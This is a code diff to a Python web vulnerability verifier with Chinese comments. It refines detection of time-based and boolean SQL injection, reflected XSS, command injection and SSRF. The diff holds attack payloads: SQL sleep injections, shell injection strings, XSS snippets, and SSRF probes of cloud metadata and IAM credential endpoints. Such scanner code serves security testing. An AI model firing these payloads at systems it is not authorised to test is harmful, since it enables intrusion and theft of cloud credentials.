@@ -77,10 +77,13 @@ class VulnerabilityVerifier:
     
     def verify_sqli_time_based(self, url: str, param: str, delay: int = 5) -> VerificationResult:
         """时间盲注验证"""
-        # 基准请求
-        base_url = url
-        _, _, base_time, _ = self._request(base_url)
-        
+        # 多次基准请求取平均值，减少网络波动影响
+        base_times = []
+        for _ in range(3):
+            _, _, bt, _ = self._request(url)
+            base_times.append(bt)
+        base_time = sum(base_times) / len(base_times)
+
         # Sleep payload
         payloads = [
             f"' AND SLEEP({delay})--",
@@ -88,13 +91,14 @@ class VulnerabilityVerifier:
             f"'; WAITFOR DELAY '0:0:{delay}'--",
             f"' AND pg_sleep({delay})--",
         ]
-        
+
         for payload in payloads:
             test_url = url.replace(f"{param}=", f"{param}={urllib.parse.quote(payload)}")
             _, code, elapsed, length = self._request(test_url)
-            
-            # 如果响应时间显著增加
-            if elapsed >= delay - 0.5:
+
+            # 修复: 响应时间必须显著大于基准时间+延迟阈值，避免误报
+            expected_delay = base_time + delay
+            if elapsed >= expected_delay - 0.5 and elapsed >= delay * 0.8:
                 return VerificationResult(
                     vuln_type="SQL Injection (Time-based Blind)",
                     payload=payload,
@@ -140,19 +144,25 @@ class VulnerabilityVerifier:
                 # 检查响应差异
                 len_diff = abs(true_len - false_len)
                 code_diff = true_code != false_code
-                
-                # 内容差异检测
-                content_diff = len([i for i in range(min(len(true_body), len(false_body))) 
-                                   if true_body[i] != false_body[i]]) > 50
-                
-                if len_diff > 100 or code_diff or content_diff:
+
+                # 修复: 使用百分比差异而非固定阈值
+                min_len = min(len(true_body), len(false_body))
+                max_len = max(len(true_body), len(false_body))
+                len_diff_ratio = (max_len - min_len) / max_len if max_len > 0 else 0
+
+                # 内容差异检测 - 使用百分比
+                diff_count = sum(1 for i in range(min_len) if true_body[i] != false_body[i])
+                content_diff_ratio = diff_count / min_len if min_len > 0 else 0
+
+                # 判断条件: 长度差异>10% 或 状态码不同 或 内容差异>5%
+                if len_diff_ratio > 0.1 or code_diff or content_diff_ratio > 0.05:
                     return VerificationResult(
                         vuln_type="SQL Injection (Boolean-based Blind)",
                         payload=f"True: {true_p} | False: {false_p}",
                         url=url,
                         is_vulnerable=True,
                         confidence="medium",
-                        evidence=f"Response diff: len={len_diff}, code={true_code}vs{false_code}",
+                        evidence=f"Response diff: len_ratio={len_diff_ratio:.2%}, code={true_code}vs{false_code}, content_diff={content_diff_ratio:.2%}",
                         response_time=0,
                         response_code=true_code,
                         response_length=true_len,
@@ -233,21 +243,31 @@ class VulnerabilityVerifier:
         body, code, elapsed, length = self._request(test_url)
         
         if body:
-            # 检查是否反射
+            # 检查是否反射 - 修复: 完善HTML实体编码检测
             raw_reflected = marker in body
             encoded_reflected = urllib.parse.quote(marker) in body
-            html_encoded = f"&#{ord(marker[0])};" in body
-            
+
+            # HTML实体编码检测 (&#x27; &#39; &lt; &gt; 等)
+            html_entity_patterns = [
+                f"&#{ord(c)};" for c in marker  # 十进制实体
+            ] + [
+                f"&#x{ord(c):x};" for c in marker  # 十六进制实体
+            ]
+            html_encoded = any(p in body.lower() for p in html_entity_patterns)
+
             # 检查是否在危险上下文中
             dangerous_contexts = [
                 f"<script>{marker}", f"<script>alert('{marker}')",
                 f"onerror={marker}", f"onclick={marker}",
                 f"<img src=x onerror=alert('{marker}')",
+                f"javascript:{marker}",  # 新增
+                f"<svg onload={marker}",  # 新增
             ]
-            
+
             in_dangerous_context = any(ctx in body for ctx in dangerous_contexts)
-            
-            if raw_reflected and not encoded_reflected:
+
+            # 修复: 正确使用html_encoded变量判断
+            if raw_reflected and not encoded_reflected and not html_encoded:
                 return VerificationResult(
                     vuln_type="Cross-Site Scripting (Reflected XSS)",
                     payload=test_payload,
@@ -261,7 +281,7 @@ class VulnerabilityVerifier:
                     verification_method="reflection_check",
                     recommendation="实施输出编码, 使用CSP头"
                 )
-            elif encoded_reflected:
+            elif encoded_reflected or html_encoded:
                 return VerificationResult(
                     vuln_type="XSS (Potentially Safe)",
                     payload=test_payload,
@@ -362,16 +382,25 @@ class VulnerabilityVerifier:
             f"`sleep {delay}`",
             f"$(sleep {delay})",
             f"; ping -c {delay} 127.0.0.1",
+            # Windows payloads
+            f"& ping -n {delay} 127.0.0.1 &",
+            f"| timeout /t {delay}",
         ]
-        
-        # 基准时间
-        _, _, base_time, _ = self._request(url)
-        
+
+        # 修复: 多次基准请求取平均值
+        base_times = []
+        for _ in range(3):
+            _, _, bt, _ = self._request(url)
+            base_times.append(bt)
+        base_time = sum(base_times) / len(base_times)
+
         for payload in payloads:
             test_url = url.replace(f"{param}=", f"{param}={urllib.parse.quote(payload)}")
             _, code, elapsed, length = self._request(test_url)
-            
-            if elapsed >= delay - 0.5:
+
+            # 修复: 响应时间必须显著大于基准时间+延迟
+            expected_delay = base_time + delay
+            if elapsed >= expected_delay - 0.5 and elapsed >= delay * 0.8:
                 return VerificationResult(
                     vuln_type="Remote Code Execution (RCE)",
                     payload=payload,
@@ -401,12 +430,28 @@ class VulnerabilityVerifier:
     
     def verify_ssrf(self, url: str, param: str, callback_url: str = None) -> VerificationResult:
         """SSRF验证"""
-        # 内部地址探测
+        # 修复: 完善内部地址探测，添加Azure/GCP/阿里云元数据
         internal_targets = [
+            # 本地地址
             "http://127.0.0.1",
             "http://localhost",
             "http://[::1]",
-            "http://169.254.169.254/latest/meta-data/",  # AWS
+            "http://0.0.0.0",
+            "http://127.1",
+            # AWS元数据
+            "http://169.254.169.254/latest/meta-data/",
+            "http://169.254.169.254/latest/user-data/",
+            # GCP元数据
+            "http://metadata.google.internal/computeMetadata/v1/",
+            "http://169.254.169.254/computeMetadata/v1/",
+            # Azure元数据
+            "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
+            # 阿里云元数据
+            "http://100.100.100.200/latest/meta-data/",
+            # DigitalOcean元数据
+            "http://169.254.169.254/metadata/v1/",
+            # Kubernetes
+            "http://kubernetes.default.svc",
         ]
         
         for target in internal_targets:
@@ -414,11 +459,20 @@ class VulnerabilityVerifier:
             body, code, elapsed, length = self._request(test_url)
             
             if body:
-                # 检查是否获取到内部信息
+                # 修复: 扩展云元数据检测指标
                 indicators = [
-                    "ami-id", "instance-id",  # AWS metadata
+                    # AWS
+                    "ami-id", "instance-id", "iam/security-credentials",
+                    # GCP
+                    "project-id", "instance/zone", "service-accounts",
+                    # Azure
+                    "vmId", "subscriptionId", "resourceGroupName",
+                    # 阿里云
+                    "instance-id", "region-id", "zone-id",
+                    # 通用
                     "localhost", "127.0.0.1",
                     "root:", "daemon:",  # /etc/passwd
+                    "kube-system", "kubernetes",  # K8s
                 ]
                 
                 for indicator in indicators:
